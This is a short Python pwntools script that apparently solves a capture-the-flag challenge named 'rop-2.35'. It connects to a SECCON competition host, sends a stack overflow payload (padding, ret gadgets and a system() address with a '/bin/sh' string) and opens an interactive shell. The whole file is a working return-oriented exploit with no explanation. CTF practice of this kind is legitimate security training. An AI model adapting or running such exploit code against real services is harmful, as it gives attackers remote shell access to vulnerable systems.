#!/usr/bin/env python3

from pwn import *

class ProbIO:
    def __init__(self, r):
        self.r = r
        self.sla = lambda t, x: self.r.sendlineafter(t, x)

    def comm(self, x):
        self.sla("something:", x)

class Primitives:
    def __init__(self, io, e):
        self.io = io
        self.e = e

    def chain(self, *args, **kwargs): return self.io.comm(*args, **kwargs)
    def makeChain(self, *args, **kwargs):
        self.offset = args[0]
        self.binsh = args[1]
        self.system = args[2]
        self.ret = args[3]

        self.payload = self.binsh.encode() * 3
        self.payload += b"A" * (self.offset - len(self.payload))
        self.payload += p64(self.ret)
        self.payload += p64(self.ret)
        self.payload += p64(self.system)

        return self.payload


def exploit(io, pri):
    offset = 24
    binsh = "/bin/sh\x00"
    system = 0x0000000000401169
    ret = 0x0000000000401184

    payload = pri.makeChain(offset, binsh, system, ret)
    print(payload)
    pri.chain(payload)

    io.r.interactive()

def main(r, e):
    io = ProbIO(r)
    pri = Primitives(io, e)
    exploit(io, pri)

if __name__ == "__main__":
    #r = remote("127.0.0.1", 9929)
    r = remote("rop-2-35.seccon.games", 9999)
    e = ELF("./rop-2.35/chall")
    main(r, e)
